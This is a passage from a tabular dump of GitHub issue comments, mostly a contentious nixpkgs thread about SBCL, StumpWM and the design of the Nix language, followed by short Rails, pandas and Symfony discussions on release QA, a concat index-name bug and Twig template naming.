nerfed; furthermore they should likely be integrated into the build process on Hydra, so ever. How/if this can be fixed depends on the upstream project and the tests in question; while many projects do enable tests (by specifying  in their ), this isn't always easily doable in some cases. I'm afraid I don't know much about the specific tests in question here to comment. 4) SBCL dynamic dependencies/cffi libraries need to be properly managed in some way. There are a slew of other packages that manage their own subpackages in a similar way; Emacs is one of them, in fact. Another is OCaml or the Haskell package set. In short, we tend to write environment wrappers which properly 'set up' the environment for a specific package. For example, when we use GCC and specify a library like  in the  of an executable, this actually is translated into a set of paths in which GCC will look for libraries - this way,  directives properly work, as well as flags like . These paths are actually provided via environment variables - and GCC is actually a shell script that wraps the real GCC in with the proper flags. This explains why we have packages like  or whatnot. We would probably equally need something like an  tool, that when invoked will properly set up an environment in which the real SBCL executable will be able to  the right libraries (assuming of course there's some flag/option to control the base directory of where the  occurs and where SBCL searches for shared objects in the first place). Then, individual SBCL packages would go into their own namespace, such as , where people could select the sub libraries they want. We have quite a few toolchains that follow this exact scenario. 5) StumpWM and SBCL are outdated it seems, and could do with a working update. Really though, these are all separate issues in a way, so I would suggest you file them each in a ticket so they can be triaged and more easily tracked by developers. Having a meta-ticket is fine in general AFAIK (maybe 'overhaul SBCL support' which most of the issues would fall under), although keeping separate issues for the separate subtasks makes it easier to manage them and address individual concerns. Of course, I'm not going to do this for you, but I'd suggest that it's probably the easiest way to at least have your complaints looked at (as opposed to posting a very long Emacs buffer - the syntax highlighting actually makes it rather painful to read). Don't worry about it - although you won't be getting any from me in the future. Although I will certainly return and be sure to call you out on shitty behavior should I see it. After all, what kind of Thought Police™ would I be if I didn't? I'd be letting you down, what with the expectations you set for me! ",,False,False,4952
nixpkgs/NixOS/4952/62671091,"This issue is fascinating, I've never seen a bug report written in LISP before. I'm also a little perplexed by the general tone and sense of entitlement but anyway... I'd like to address some of your points @friend . I see that you try to build EMACS from the command line. That's not how it is done in NixOS as that's not repeatable and stateful. Either you clone nixpkgs and change the nix expressions already there, or you use the packageOverrides in your  (see  asked 1 question on #nixos and then logged off when you got no replies? Perhaps the nix-dev mailing list would be more suited to your IRC style. I general I would say there is a passion for code quality and statelessness in NixOS, just go look at all the comments on issues asking to change this or that. You seem to have gotten the reverse impression from the learning curve and EMACS. Nothing I can do about that, just interesting. If you like the Nix concepts you could implement StumpWM the way you like it, or you could just walk away. I don't know what causes your SBCL error. The guys in the LISP channel are correct, when you build something for Nix you fix all inputs, and if something doesn't work like that you wrap it so it only sees the part of the world that you want. Oh, those sb-posix test failures are also perplexing. Expecting 13, getting /? Wow. Of course, just turning them off was not the right thing to do. Anyway. ",,False,False,4952
nixpkgs/NixOS/4952/62671369,Oh and hats off to @friend for his detailed and gracious answers. ,,False,False,4952
nixpkgs/NixOS/4952/62672092,"Oh, and I will leave one mention about the IRC channel I am not sure in what timezone the OP resides, but realistically from my time contributing I've noticed NixOS has a very large European userbase and a much smaller ""not European"" userbase. Given the assumption the logs are timestamped to a European timezone, it's perhaps not surprising most people weren't available in the early morning hours. So knowing nothing about OP, I imagine this could possibly have some impact on the availability of people to respond. As an American myself, this too has caught me off guard. So yes, the  mailing list may actually be a better place to formulate longer discussions, depending on your availability. ",,False,False,4952
nixpkgs/NixOS/4952/62673641,"Also, currently NixPkgs has a working StumpWM 0.9.8 package (previous release) compiled using SBCL-1.2.5 (which is also in NixPkgs). Some of SBCL tests make assumptions about the base system;  the others are run during the SBCL build  (look for ACLREPL-TESTS) ",,False,False,4952
nixpkgs/NixOS/4952/62874698,"@friend There's an SDF representation of the syntax in @friend's PHD thesis starting on page 64, though I'm not sure if that would be entirely up to date. It also can be seen as acting as a design document, and lays out the thought and central metaphors behind Nix/OS pretty clearly. ",,False,False,4952
nixpkgs/NixOS/4952/62895128,"@friend actually, you could say that  (Bison configuration) is a very strict, machine-readable BNF form... I wonder if there's a tool that takes Bison input and generates a human-readable grammar. ",,False,False,4952
nixpkgs/NixOS/4952/63006110,I've seen everyone's responses and will be responding in due time. ,,False,False,4952
nixpkgs/NixOS/4952/63131177,"Relevant, apparently you can get an almost-BNF out of bison with  ",,False,False,4952
nixpkgs/NixOS/4952/65074661,"FWIW, here's the grammar. The tokens are defined in  $accept start $end  1 start expr  2 expr expr_function  3 expr_function ID '' expr_function 4              | '{' formals '}' '' expr_function 5              | '{' formals '}' '@' ID '' expr_function 6              | ID '@' '{' formals '}' '' expr_function 7              | ASSERT expr ';' expr_function 8              | WITH expr ';' expr_function 9              | LET binds IN expr_function 10              | expr_if  11 expr_if IF expr THEN expr ELSE expr 12        | expr_op  13 expr_op '!' expr_op 14        | '-' expr_op 15        | expr_op EQ expr_op 16        | expr_op NEQ expr_op 17        | expr_op '&lt;' expr_op 18        | expr_op LEQ expr_op 19        | expr_op '&gt;' expr_op 20        | expr_op GEQ expr_op 21        | expr_op AND expr_op 22        | expr_op OR expr_op 23        | expr_op IMPL expr_op 24        | expr_op UPDATE expr_op 25        | expr_op '?' attrpath 26        | expr_op '+' expr_op 27        | expr_op '-' expr_op 28        | expr_op '*' expr_op 29        | expr_op '/' expr_op 30        | expr_op CONCAT expr_op 31        | expr_app  32 expr_app expr_app expr_select 33         | expr_select  34 expr_select expr_simple '.' attrpath 35            | expr_simple '.' attrpath OR_KW expr_select 36            | expr_simple OR_KW 37            | expr_simple  38 expr_simple ID 39            | INT 40            | '""' string_parts '""' 41            | IND_STRING_OPEN ind_string_parts IND_STRING_CLOSE 42            | PATH 43            | SPATH 44            | URI 45            | '(' expr ')' 46            | LET '{' binds '}' 47            | REC '{' binds '}' 48            | '{' binds '}' 49            | '[' expr_list ']'  50 string_parts STR 51             | string_parts_interpolated 52             | %empty  53 string_parts_interpolated string_parts_interpolated STR 54                          | string_parts_interpolated DOLLAR_CURLY expr '}' 55                          | STR DOLLAR_CURLY expr '}' 56                          | DOLLAR_CURLY expr '}'  57 ind_string_parts ind_string_parts IND_STR 58                 | ind_string_parts DOLLAR_CURLY expr '}' 59                 | %empty  60 binds binds attrpath '=' expr ';' 61      | binds INHERIT attrs ';' 62      | binds INHERIT '(' expr ')' attrs ';' 63      | %empty  64 attrs attrs attr 65      | attrs string_attr 66      | %empty  67 attrpath attrpath '.' attr 68         | attrpath '.' string_attr 69         | attr 70         | string_attr  71 attr ID 72     | OR_KW  73 string_attr '""' string_parts '""' 74            | DOLLAR_CURLY expr '}'  75 expr_list expr_list expr_select 76          | %empty  77 formals formal ',' formals 78        | formal 79        | %empty 80        | ELLIPSIS  81 formal ID 82       | ID '?' expr  ",,False,False,4952
nixpkgs/NixOS/4952/70743024,"There has been no activity for a couple of weeks, so I'll close the issue. If there are actionable items hidden in this thread somewhere, I guess it would be better to create separate, new tickets for those. ",,False,False,4952
nixpkgs/NixOS/4952/70775570,I'll note that I've drafted up my response to all unanswered messages but am busy and don't know when I'll have time to finish it off. Closing the issue is fine with me. ,,False,False,4952
nixpkgs/NixOS/4952/70809334,@friend just paste your draft? Otherwise you'll never come back to it... ,,False,False,4952
nixpkgs/NixOS/4952/70896941,I don't publish drafts. I'm in the middle of something at the moment and will respond over the weekend. ,,False,False,4952
nixpkgs/NixOS/4952/70899963,-) reminds me of classical Cathedral vs. Bazaar dilemma. ,,False,False,4952
nixpkgs/NixOS/4952/71556033,Wasn't able to finish over the weekend and am busy for the next two days. Best guess is wed/thurs. ,,False,False,4952
nixpkgs/NixOS/4952/73421969,"Note1 I've read NixOS A Purely Functional Linux Distribution and Nix A Safe and Policy-Free System for Software Devlopment, but not the associated PHD thesis. The contents listing didn't indicate that it'd introduce me to any new ideas. Note2 I've ignored forth and apl derivatives in this comment. Anyone familiar with will understand why upon reading it. Fundamentally, package management is composed of graph traversals and transformations. The goal that separates NixOS from other package managers, reproducible builds, can be rendered as ""the ability to save and restore unix's dependency graph"". This is a neat idea, but the implementation merely trades one set of problems for another. Many crucial design decisions that should have been throughly discussed were completely ignored. For example, nowhere in the design documents is it stated that every(?) programming language already has its own package manager(s) with its own idiosyncrasies that for the most part don't share concepts or code with the others. There are many good questions that originate from this fact, were one to acknowledge it. Examples at what point is appropriate to leave package management up to a language's ecosystem? Is there ever a reason to? Can maintainers be convinced that the 'nixos way' is a good one and that packaging their code with a flag of some sort that produces a nix friendly build script is a reasonable request? Are we confident enough in nix to spend their time? Given that the NixOS plan is to modify build scripts and sources to its liking, what is the proper way to go about doing source-to-source transformations? Are there commercial offerings that solve this problem? The undiscussion of these issues is prototypical of the Nix design documents and documentation. From NixOS A Purely Functional Linux Distribution, How exactly does the reference scanner detect runtime dependencies? Regex and sed hackery? Or the correct way, parsing each language into its abstract syntax tree (ast), walking that and finding references to unix level dependencies (both static and dynamic)? I assume the former, as the latter is a great deal of work and would have been mentioned. Also, the only complete C99 parser (i.e., one that takes into account all the GCC extensions used in the linux kernel) I'm aware of is the haskell package Language.C.AST - and nix doesn't use haskell. The problem with anything other than traversing a language's ast is that you're forever stuck with an approximation of the input language, resulting in false positives etc. This is not new information. Notice that the paper says, but fails to mention how many people used NixOS over those 5 years, how many times undeclared build time dependencies /outside/ of the Nix store were encountered or how many packages were in the Nix store over this time period. Is this not relevant information? As Naggum stated above ""the rub with these 90% solutions is that you have /no/ idea when they return the wrong value becuase the approximation destroys any ability to determine correctness."" If say, most of the NixOS users are NixOS developers (which they are) and the reference scanner doesn't walk the ast of the programs in question (which it doesn't), no reported failures means exactly nothing, because there will be many code paths not encountered by its users due to the sheer complexity of the software being interfaced with (e.g., how many NixOS +developers+ users use emacs docview? Not many apparently). There are other issues with these papers I'm going to skip over, such as the clearing of environment variables (the proper thing to do imo is to gensym them to prevent unwanted interactions and study how they're being used - filter for 'functional' builds...), failure to discuss why a new project is needed in the first place (why can't you just perform this computation via an extension to an existing project?), total wtf issues with the papers (who are they written for? One who needs the concept of ""file system"" explained is going to have nfi what emacs lisp or ~/what/all/the/slashes/signify) etc. The heart of the matter is that unix (ostensibly[0]) plays host to many different philosophies of how to go about programming. Languages differ in their approach to build systems, package management, syntax and foreign function interfaces. To change the way many software packages are built in a semi-automated, non-ast-walking fashion is insane. Not to discuss this in the design documents is insane. NixOS has 46 contributors and the documentation is sufficiently general as to give each contributor his own wildly different interpretation of the scope of the project. As far as I can tell, were one to extrapolate from the given information to a set of concrete requirements we see that NixOS plans to rewrite the build scripts for every version of every project on unix. Again, this is insane. The correct thing to do in this situation is to realize the utter impossibility of the task that has been set forth and re-evaluate one's approach.[1] Let's examine the reference scanner. What is the correct way to approach the problem? We know regular expressions cannot respect the semantics of a language and thus are (unless used as a part of a larger parser) inappropriate for meta-programming (source-to-source transformations). Thus, we must work by manipulating the ast of various languages, and then pretty printing the altered code into the language's concrete syntax. Most languages don't offer the ability to do this, and one examines into e.g., Clang, he will see all sorts of nonsense about concrete/surface syntax, context free grammars and compiler technologies. This certainly can't all be necessary (hint it isn't). Consider the following mathematical expression (3 + 2)  8 / 3  3^6 Fully parenthesizing yields (((3 + 2)  8) / (3  3^6)) When computers execute programs, or humans mathematics, the order of operations must be taken into account. one way to notate the previous expression to remove such ambiguities present in mathematical notation is to move operators to the front of each parenthesized list, passing the remaining elements as its arguments. This is known as fully-parenthesized prefix notation. (/ ( (+ 3 2) 8) ( 3 (^ 3 6))) This notational scheme has a direct mapping to the program's ast, which can be rendered as  the pattern? An s-expression (fully parenthesized prefix notation) is merely a serialization for the ast. Thus,  manipulations of the sexpr correspond to manipulations of the ast. Languages with the vocabulary to manipulate the s-expression structure can manipulate themselves (their ast) just as easily as any other thusly structured information. It follows from this that all software 'tooling' and translation tasks, transparently become trees e.g., find me all things that call this function, reference this variable, modify all build scripts to take into account the new &amp;optional argument in the updated library, etc. are viewed quite transparently (and correctly) as tree traversals.[2] For whatever reason, many find s-expressions distasteful and spend much of their lives attempting to add the same meta-programming facilities to ALGOL derived languages. They all have failed. Not because of any sort of mechanical failing of the computer, but the human's inability to fully comprehend the parsing and syntactical schemes they're able to create (Ruby's parser is 10k lines of C, Clang's is &gt;100k loc. Note that the entirety of SBCL is ~300k loc, and has much fat that could be trimmed off -  is a notable failure in this regard. Watch this video  attention to 3739-4250 and you'll get to see Paul Phillips flipping out over ir/asts (same thing!). He even states his plan for the next 25 years - attempt to solve a problem solved 50+ years ago ( particular, I found these quotes quite pertinent. ""I want to programmatically generate asts and feed those"" ""Even though this is what everybody does it's kinda nuts, why is the canonical code representation a STRING?!"" (not everyone does this, just algol derivatives) ""The ast is going to be designed along side the VM"" ""I need a tight feedback loop on the thing that I'm working on right now"" Wait, like every common lisp compiler ever? 30+ years behind the times yo. ""the code that you look at, that ought to be a reflection of the AST. The canonical thing ought to be the tree, the code is a view of it.... It's trees that are fundamental, that's what we work with"" Lol. Gotcha. ""something not offered by our tremendously entangled compiler, which doesn't even have a clean parse tree. It's comical. Try to get back to the source from what you get out of the scala parser. To me, the minimum test of a parser is that it parses!"" Lol. 'Comical' is definitely the right word. ""modifiability is paramount. If it isn't straightforward to modify, it will never be any good. It will never be fast. It will never be correct. And it will eventually be replaced by something modifiable... after consuming as many hours as you feed it."" Again, 30+ yrs behind the times[3]  what does all this have to do with NixOS? Much of the complexity in NixOS originates in the failure to address why it isn't a trivial modification on an existing project. Were they to have honestly sized up the problem they'd end up at something like people suck at both reading &amp; programming, also asts are fundamental. They'd then realize that at some point you have to choose some languages and leave others, because not everyone has something to offer and writing fully compliant parsers for all the languages involved is about as entertaining as building pyramids. When one has decided on a particular scheme, one could set about implementing ""the ability to save and restore parts of unix's dependency graph"". But by failing to address this complexity NixOS inherits it, and in practice, adds to it by the 'invention' of /yet another/ language created for no particular reason. 800+ existing languages[4] and /none of them/ have the required properties? Nonsense. Allow me to anticipate your retorts ""I need to know that my nix code is functional"" +BEGIN_SRC common lisp ;; let's assume, for the sake of argument that you only want the symbols ;; design-antipattern', `the-type-gods-will-save-me' plus ;; strings to occur in your 'language' in addition to strings and keywords. You ;; know that the functions these symbols describe are functional and thus, a ;; valid program is functional. ;; ;; here is how you validate a 'nix' ast. (defun flatten (tree)   ""Traverses the tree in order, collecting non-null leaves into a list.""   (let (list)     (labels ((traverse (subtree)                (when subtree                  (if (consp subtree)                      (progn                        (traverse (car subtree))                        (traverse (cdr subtree)))                      (push subtree list)))))       (traverse tree))     (nreverse list))) (defvar myast '(functional-lol (design-antipattern ""death"")                                 (the-type-gods-wont-save-me ""destruction and chaos! also, bunnies""))) (defun validate (ast)   (every (lambda (k) (or (keywordp k) (and (symbolp k)              (member k '(functional-lol design-antipattern the-type-gods-will-save-me) test 'eq))              (stringp k)))      (flatten ast))) (validate myast) ; =&gt; nil If you like the Nix concepts you could implement StumpWM the way you like it, or you could just walk away. I'm also a little perplexed by the general tone and sense of entitlement but anyway... I'd like to address some of your points @friend . There's an SDF representation of the syntax in @friend's PHD thesis starting on page 64, though I'm not sure if that would be entirely up to date. It also can be seen as acting as a design document, and lays out the thought and central metaphors behind Nix/OS pretty clearly. -) reminds me of classical Cathedral vs. Bazaar dilemma. The process of constructing instruction tables should be very fascinating. There need be no real danger of it ever becoming a drudge, for any processes that are quite mechanical may be turned over to the machine itself. -- Turing, A. M., 1946, Proposed electronic calculator, report for National Physical Laboratory, Teddington for the present-day darkness in the programmer's world the programmers themselves are responsible and nobody else. -- Dijkstra Suppose you're trying to find the best way to structure your description of something.  (Examples  choosing the structure for a computer program to perform some task; or choosing the structure for a theory of physics.) What you hope to find is the natural structure of what you're describing — a structure that affords a really beautiful, simple description.  When you strike the natural structure, a sort of resonance occurs, in which various subsidiary problems you may have had with your description just melt away, and the description practically writes itself. But here's a problem that often occurs  You've got a structure that affords a pleasing approximate description.  But as you try to tweak the description for greater precision, instead of the description getting simpler, as it should if you were really fine-tuning near the natural structure, instead the description gets more and more complicated.  What has happened, I suggest, is that you've got a local optimum in solution space, instead of the global optimum of the natural structure  small changes in the structure won't work as well as the earlier approximation, and may not work at all, so fundamental improvement would require a large change to the structure. --  is a simple and elegant answer to this question Just learn Common Lisp well first.  New languages are exciting to people who know mostly new languages, so learn an old language before you learn new ones and get out of the maelstrom that will drown you in ever new languages that add nothing at all except some miniscule additional feature from another language that someone needed to make a whole new language to implement because he did not know (Common) Lisp to begin with.  A ""new"" language that differs from the rest of the crop by one or a couple features is proof positive that both what it came from and what it has become are mutations about to die.  There are tens if not hundreds of thousands of such ""languages"" that people have invented over the yeare, for all sorts of weird purposes where they just could not use whatever language they were already using, could not extend it, and could not fathom how to modify its tools without making a whole new language.  They never stopped to think about how horribly wasteful this is, they just went on to create yet another language called Dodo, the Titanic, Edsel, Kyoto-agreement... -- Erik Naggum,  This could be largely automated, but that is a discussion for another day. ",,False,False,4952
nixpkgs/NixOS/4952/73422170,"Note1 I've read NixOS A Purely Functional Linux Distribution and Nix A Safe and Policy-Free System for Software Devlopment, but not the associated PHD thesis. The contents listing didn't indicate that it'd introduce me to any new ideas. Note2 I've ignored forth and apl derivatives in this comment. Anyone familiar with will understand why upon reading it. Note3 I posted and deleted this approximately ~5min ago - sorry, the using  common lisp ;; let's assume, for the sake of argument that you only want the symbols ;; design-antipattern', `the-type-gods-will-save-me' plus ;; strings to occur in your 'language' in addition to strings and keywords. You ;; know that the functions these symbols describe are functional and thus, a ;; valid program is functional. ;; ;; here is how you validate a 'nix' ast. (defun flatten (tree)   ""Traverses the tree in order, collecting non-null leaves into a list.""   (let (list)     (labels ((traverse (subtree)                (when subtree                  (if (consp subtree)                      (progn                        (traverse (car subtree))                        (traverse (cdr subtree)))                      (push subtree list)))))       (traverse tree))     (nreverse list))) (defvar myast '(functional-lol (design-antipattern ""death"")                                 (the-type-gods-wont-save-me ""destruction and chaos! also, bunnies""))) (defun validate (ast)   (every (lambda (k) (or (keywordp k) (and (symbolp k)              (member k '(functional-lol design-antipattern the-type-gods-will-save-me) test 'eq))              (stringp k)))      (flatten ast))) (validate myast) ; =&gt; nil ♠ ""I don't want to require a whole compiler!"" By failing to make use of existing programs NixOS not only adds a language (compiler/interpreter), but the requirement for an Emacs mode (plus one more for every other editor!), custom syntax highlighting, extra crap for auto-completion etc. etc. One should instead make use of what already exists. As it stands SLOCCOUNT reports 26.3k loc, divided across 7 languages being are used to introduce another for the nix project. This number of languages alone is enough to guarantee that no one will ever understand the whole codebase on a rolling basis and have enough time to do much else with their life. A preceptable analogy to the natural languages springs forth if we created them for the same reason so-called professional programmers create programming languages, each new subculture would require a whole new alphabet/glyph scheme, phonetic system, grammatical structures etc. Though some surface features may be shared across languages, the underlying semantics they represent would change in unpredictable and often incompatible ways.[5] ""So, you want us to write lisp? What if something better comes along?"" You are faced with a choice - either learn from those who came before you, or spend the rest of your life fighting monstrosities of your own creation, attempting to eke out some order in all the chaos, be it the SDF/BNF format of a language's syntax or otherwise. In any case, if something better comes along, transforming your s-expression code into &lt;powerful new notation&gt; will be a straightforwards intern-level task[6]. Now to address some unanswered questions. You don't say. You're in Mexico city and ask a bystander to direct you to the airport (your phone died, you lack a map and you're going to miss your plane unless you make it to the airport soon). He gives very specific instructions, which you write down and follow exactly. You reach the last instruction somewhere near the slums, missing your flight. As such, you swear loudly. Is anyone entitled to correct directions? Of course not. I however, expect the /bare minimum/ of people giving correct directions and accurate descriptions of their projects, much like I expect my friends to brush their teeth regularly. If I say ""jump in front of the bus on my mark, ready? 1, 2, 3 - JUMP!"" it is clear what I'm asking/ordering, what is less clear is why I'd be asking/ordering someone to jump in front of a bus. There are very few classics in the field of computing. We are at the very beginning of this journey and it hasn't even begun to get interesting yet. IMHO, the Cathedral vs. Bazaar isn't in anyway a dilemma or a classic. Linux was a failure 20 years ago, it is a failure today and any posturing otherwise is just that. See The UNIX-HATERS Handbook[0] for more information. I find the contrast between these quotes accurately depicts the computing situation circa 2015.  Footnotes  [0] In actuality unix is mostly a pile of stupid, see web.mit.edu/~simsong/www/ugh.pdf [1] [2] This scheme the surrounding ideas are so fundamental that they've sometime's referred to as ""Maxwell's equations of Software"". You can read more about Lisp and s-expressions elsewhere so I'll not repeat it here.  This information re, Scala is interesting beyond the technicalities. Typesafe, the Scala company (has Martin Odersky as Chairman and Chief Scientist) has received 31 MM in funding. Coursera (who built everything in Scala) has received 85MM. I'll predict they'll eventually fail as they're out-competed by more intelligent adversaries, though both will (due the amount of funding and high-profile people involved, probably limp along for years to come). Last I checked, Coursera already had fungus growing on it something about, ""usg-sponsored studies find that coursera is better than starving in Africa"" [4]  corresponding lisp narrative feels 'organic'. Consider the SBCL (steel bank common lisp) compiler. It is descended from CMUCL python compiler and uses some of its code, changing it as circumstances require (and of course, any transformations that needed automation were but a tree traversal away). Naggum also had some related thoughts [6] This could be largely automated, but that is a discussion for another day. ",,False,False,4952
nixpkgs/NixOS/4952/73492960,"Holy wall of text @friend! I understand that you fully wanted to underline your points but I would have been happy with  you didn't take existing source package management like CPAN into account 10 years ago you just scan for strings in the build output so you can not be 100% sure that the dependency graph is correct you invented Nix instead of using something like LISP  Those are your points right, or am I misunderstanding them/missing some? Package management was indeed not built in from the beginning. The current approach is to convert instructions to npm and friends into nix package specifications. AFAIK this is in place for Haskell, Ruby, NodeJS, Python, Go and maybe Perl, not sure. This works okay but still has problems when semantics clash. The build flow is something like ""generate nix expressions for dependencies, store in nixpkgs tree next to package and create nix expression for the package"". Because of idempotency it doesn't matter if dependencies are mentioned many times, if they result in the same inputs hash they will be reused. You can think of this as a very lazy static evaluation of needed packages out of hundreds of thousands of third-party packages. Considering the alternative of putting Nix expressions in other package management systems, I think this works pretty well. Regarding the hash checking, the observation of no problems with it still stands. Dependency detection is quite robust and has low impact if incorrect.  False positives (a dependency is falsely detected) can only be due to spurious unused references (it happens and we fix it if found), or 32+ byte ascii strings (hash+package name/version) occurring by chance in compiled code (extremely unlikely) False negatives (a dependency is not detected) can happen if the references are not stored in plain text, due to compression or encoding. I don't know of this happening in any of nixpkgs. The impact of incorrect dependencies is either increasing closure size, or missing dependencies when garbage collecting or installing a package from binary. The former is hardly problematic, the latter hasn't happened yet afaik, despite automatic GC running on many production systems.  So yes, both those things are only 99.9% solutions, but they are gaining 9s each year. The 100% solution seems infeasible to me in both cases. For the last point, I think  the issues nicely. Personally I prefer the advantages Nix gives over what Guix gets via Scheme. Thank you for posting your thoughts, I still believe that NixOS and ecosystem are awesome and in a good position going forward. On Sun Feb 08 2015 at 65159 PM Gabriel Laddel notifications@friend.com wrote ",,False,False,4952
nixpkgs/NixOS/4952/73659446,"Uh... yeah, that's totally all the points I made. Toodles. ",,False,False,4952
nixpkgs/NixOS/4952/120447628,"NB I'm a Lisp guy who uses and likes NixOS, but isn't a big expert in NixOS. Minor remarks uioprun-program has a now reliably portable directory clause. If you only care about Unix, then you can use ; to separate commands in a single string. (If you want to support windows, &amp; might work, but not all implementations can successfully use CMD.EXE on Windows, and /bin/sh isn't reliably present.) NixOS isn't perfect, but is accepting patches. If you're interested in static linking of libfixposix into sbcl images, I have recipes that need to be put together into actual code, that you may be interested in. If you want a NixOS package with dynamic linking the solution is to either enhance cffi so you can statically specify the search path, or have a wrapper that initializes the search environment around the binary. Also, the solution to false negatives is that a package breaks if it's missing a dependency, so whoever is writing the package specification will notice and fix it — and thereafter it will build deterministically. ",,False,False,4952
nixpkgs/NixOS/4952/120449383,"Thanks for the info Francois. FTR, NixOS is fundamentally braindamaged. I found it was easier to create my own distribution than to hack around their crud. Details here  Fri, Jul 10, 2015 at 411 PM, François-René Rideau  notifications@friend.com wrote ",,False,False,4952
nixpkgs/NixOS/4952/269128206,"Are… are you advertising in issues of unrelated projects? On Sat, Dec 24, 2016, 937 PM Gabriel Laddel notifications@friend.com wrote ",,False,False,4952
rails/rails/33517/346979232,"Do you have rules before releasing a new version of ruby/rails, for example ""no more than x bugs"" or ""no critical bugs"" or so? Can I read them somewhere? If you do not have such rules, do you need some help setting up this quality assurance stuff - I could help with that if you like. I think it's more important to publish something stable instead of something fast. ",,False,False,33517
rails/rails/33517/409903816,"We publish release candidates before any release to catch any regressions as soon as possible. E.g. for the coming 5.2.1, we've just released rc1  is always appreciated, but I don't think we need any for the process setup here. Thanks! ",,False,False,33517
rails/rails/33517/409918202,Where can i see details about your regression tests? ,,False,False,33517
rails/rails/33517/409926626,"You can see our test matrix in Travis CI here  notice that there are very few tests that are run on JRuby, and even those are marked as ""allowed failures"". Latest Rails is not currently expected to run on JRuby, and while improving that would be nice, it's not a release blocker. The JRuby team are doing great work, within their available time, to bridge that gap -- and once it works, we'll prioritise keeping it working -- but until then, the problem is that JRuby isn't acting enough like Real Ruby; we can't fix that. If you want to see Rails running on JRuby, I'd suggest speaking to the JRuby and/or activerecord-jdbc-adapter teams they'll have a much better idea of which Rails version they have the best support for at the moment. ",,False,False,33517
rails/rails/33517/409960962,"a) Why do you not try to code as compatible as possible to jruby?  b) Do you have any release strategies for QA I can read? As mentioned before , something like ""no release if x bugs left"" or ""no release if critical bugs available"" or so? c) I work in my free time on similar things, too (others) and I know that no one can expect anything, I have only positive impulses and good ideas, a mental attitude to bring things positive forward. d) Quality for a framework is more important than the next release with n bugs left. The best mix for that can be calculated with a nash equilibrium formula. ",,False,False,33517
rails/rails/33517/409961480,"I do not understand why you not try to be compatible to the java world, your rails apps could work on apache tomcat or many government contractors allow only java bytecode. ",,False,False,33517
pandas/pandas-dev/13475/160946165,"xref #13742 for addl cases. So the issue seems to be with a string index that is not equal, as when the index of the two frames is equal (no NaNs are introduced), the name is kept and also when using numerical indexes, see  I use the concat function with input dataframes that have index.name assigned, sometimes the resulting dataframe has the index.name assigned, sometimes it does not. I ran the code below from the python interpreter, using a conda environment with pandas-0.18.1 I don't see any odd / extra characters around the ""pert_well"" column in the files between the files. Code Sample, a copy-pastable example if possible results Expected Output c.index.name should be ""pert_well"" output of pd.show_versions() INSTALLED VERSIONS commit None python 2.7.11.final.0 python-bits 64 OS Linux OS-release 2.6.32-573.7.1.el6.x86_64 machine x86_64 processor x86_64 byteorder little LC_ALL None LANG C pandas 0.18.1 nose None pip 8.1.2 setuptools 23.0.0 Cython None numpy 1.11.0 scipy None statsmodels None xarray None IPython None sphinx None patsy None dateutil 2.5.3 pytz 2016.4 blosc None bottleneck None tables None numexpr None matplotlib None openpyxl None xlrd None xlwt None xlsxwriter None lxml None bs4 None html5lib None httplib2 None apiclient None sqlalchemy None pymysql None psycopg2 None jinja2 None boto None pandas_datareader None PMEL_input_files_for_pandas_issue.zip ",,False,False,13475
pandas/pandas-dev/13475/502354307,experiencing the same bug on pandas 0.24.2 ,,False,False,13475
symfony/symfony/3150/2884438,"Unable to find template ""global_right.html"" expected to work, but fails     {% include 'global_right.html' %}    expected to work, but fails     {% include 'global_right.html' %}    this works finally     {% include 'global_right.html.twig' %}    - I assume that this is because of how Symfony2 integrates twig, because twig documentations documents an expeted behaviour  should not enforce the .twig extension - or at least, the error messages should be more concise. ",,False,False,3150
symfony/symfony/3150/3548336,This is because Sf2 supports multiple engines (and this is not related to Twig itself) The templating engine to use is selected by the last part i.e. ,,False,False,3150
symfony/symfony/3150/3548420,"@friend the include tag expect a template name. When using Twig standalone, the template name is generally directly the file name (and so can be virtually anything). The loader used in Symfony2 enforces a specific format to integrate templating with the bundle structure ",,False,False,3150
symfony/symfony/3150/3548689,"@friend ""The loader used in Symfony2 enforces...""  That's the point. It should not force me to avoid the most natural thing within development inclusions. And if it does so, then it must bring up more concise error messages. It says ""Unable to find template""  which is missleading (if not wrong, the template is there). It should say ""File not allowed, twig is configured to load only ... ...! Try this and that, or change configuration in ... ""  Can I change the configuration somewhere, thus I can include a simple ""MyTrivial.html"", too? ",,False,False,3150
symfony/symfony/3150/3548964,@friend the issue is where would a template named MyTrivial.html be found ? And the error Unable to find template comes from Twig. And it is right. The template with this name does not exist. And the name of the template is not the same thing that the name of the file in which you store it (it does not even need to be stored in a file. You could write a Twig loader loading templates from a database) ,,False,False,3150
symfony/symfony/3150/3551954,"Ok, I'm new to Symfony2. But I'm a 20+ years developer with experience in hardware-design, and thus not new to complex system / framework design. You are familiar with Symfony2, and that's exactly the reason why you don't see the obvious flaws in it. ""include"" is a known construct, with known functionality and behavior  (see e.g. apache SSI, or xiinclude for the web-domain). MyTrivial.html would be found in the same directory like the template including it. If you change this (commonly known) ""include"" behavior in Symfony2, then you should change all related information, including error messages. But as I'm mainly interested to go on, my main question is Can I change the configuration somewhere, thus I can include a simple ""MyTrivial.html"", too? If not, which would be the easiest way add such functionality via code? ",,False,False,3150
symfony/symfony/3150/3552046,"@friend even when using Twig standalone with its FilesystemLoader, include would not load a template from the current directory but relative to the path configured in the loader (which is how the name of templates is build in this loader). Symfony2 is not changing the meaning of the Twig include tag at all. It simply has a different way to name the template. The Twig environment does not know at all where the template is stored. Templates are always referenced by name. ",,False,False,3150
symfony/symfony/3150/3552811,"Well, I guess then that Symfony2 is just doing perfect, and users just want the wrong things.  I guess I'll stop to try to enhance the product (Symfony2) and will simply start to silently implement my things locally. Seems like a twig extension is the way to go. ",,False,False,3150
symfony/symfony/3150/3554610,"Well, I think there should really be a possibility to include raw HTML in core (i.e. without engine). ",,False,False,3150
symfony/symfony/3150/3556096,"Symfony2 Standard Edition is the whole stack of Symfony2 components combined in such a way to enable creation of MVC apps (correct me if I'm wrong) with some extras added such as TWIG engine for templates/views, Doctrine2 for models and some other bundles/libs. I don't see where in the core you could be using HTML and for what. Also since you're suggesting to add .html files support, why not allow for .php.inc, .inc.php, .htm and so on inclusions. Please correct me if I'm wrong. As for the original problem, I believe both @friend and @friend did a great job on explaining how things work in Sf2. So instead of improving the framework for you only, just submit a PR with a template engine that is able to load .html files directly so that everyone can benefit from your work just as well as you can benefit from the work of the others. If it should not be merged then just make a bundle out of it and publish it ) And if you don't like the error message thrown, just submit a issue report for it or, even better, a PR with an enhanced message. ",,False,False,3150
